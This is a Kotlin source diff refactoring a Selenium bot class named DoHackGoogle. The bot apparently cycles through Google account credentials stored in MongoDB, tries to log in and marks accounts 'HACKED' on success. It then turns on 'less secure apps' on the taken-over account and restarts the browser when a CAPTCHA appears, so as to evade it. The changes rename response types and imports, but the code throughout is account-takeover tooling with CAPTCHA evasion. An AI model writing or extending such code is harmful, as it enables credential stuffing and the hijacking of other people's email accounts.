@@ -1,18 +1,20 @@
 package net.scr0pt.bot.google
 
-import net.scr0pt.bot.Page
-import net.scr0pt.bot.PageManager
-import net.scr0pt.bot.PageResponse
+import net.scr0pt.selenium.Page
+import net.scr0pt.selenium.PageManager
+import net.scr0pt.selenium.Response
 import com.mongodb.client.MongoClients
 import com.mongodb.client.MongoCollection
 import com.mongodb.client.model.Updates
 import net.scr0pt.crawl.school.random
+import net.scr0pt.selenium.GoogleResponse
 import net.scr0pt.thirdservice.mongodb.MongoConnection
 import org.bson.Document
 import net.scr0pt.utils.webdriver.Browser
+import org.jsoup.select.Selector.selectFirst
 
 
- fun main() {
+fun main() {
     DoHackGoogle().run()
 }
 
@@ -98,43 +100,37 @@ class DoHackGoogle() {
                     VerifyItsYouPhoneNumberRecieveMessage {
                         println("VerifyItsYouPhoneNumberRecieveMessage success")
                     },
-                    CanotLoginForYou {
+                    CantLoginForYou {
                         //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                        println("CanotLoginForYou success")
+                        println("CantLoginForYou success")
                     }
             ))
 
-            generalWatingResult = { jsoupDoc, currentUrl ->
-                if ((jsoupDoc.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
-                    PageResponse.RECAPTCHA()
-                } else PageResponse.WAITING_FOR_RESULT()
+            generalWatingResult = {pageStatus ->
+                if ((pageStatus.doc?.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
+                    GoogleResponse.RECAPTCHA()
+                } else Response.WAITING()
             }
-
-            linearSleep = false
 
             run { pageResponse ->
                 when (pageResponse) {
-                    is PageResponse.NOT_OK -> {
-                    }
-                    is PageResponse.OK -> {
+                    is Response.OK -> {
                         update(email, "email_status", "HACKED")
                         allowLessSecureApps(driver, email, collection)
                         driver.renew(Browser.firefox)
                     }
-                    is PageResponse.NOT_FOUND_EMAIL -> {
+                    is GoogleResponse.NOT_FOUND_EMAIL -> {
                         update(email, "email_status", "NOT_EXIST")
                     }
-                    is PageResponse.INCORECT_PASSWORD, is PageResponse.PASSWORD_CHANGED -> {
+                    is GoogleResponse.INCORECT_PASSWORD, is GoogleResponse.PASSWORD_CHANGED -> {
                         update(email, "login_status", "PASSWORD_INCORRECT")
                     }
-                    is PageResponse.RECAPTCHA -> {
+                    is GoogleResponse.RECAPTCHA -> {
                         driver.renew(Browser.firefox)
                     }
-                    is PageResponse.NOT_FOUND_ELEMENT -> {
+                    is Response.NOT_FOUND_ELEMENT -> {
                     }
-                    is PageResponse.WAITING_FOR_RESULT -> {
-                    }
-                    is PageResponse.INVALID_CURRENT_PAGE -> {
+                    is Response.WAITING -> {
                     }
                 }
                 println(pageResponse)
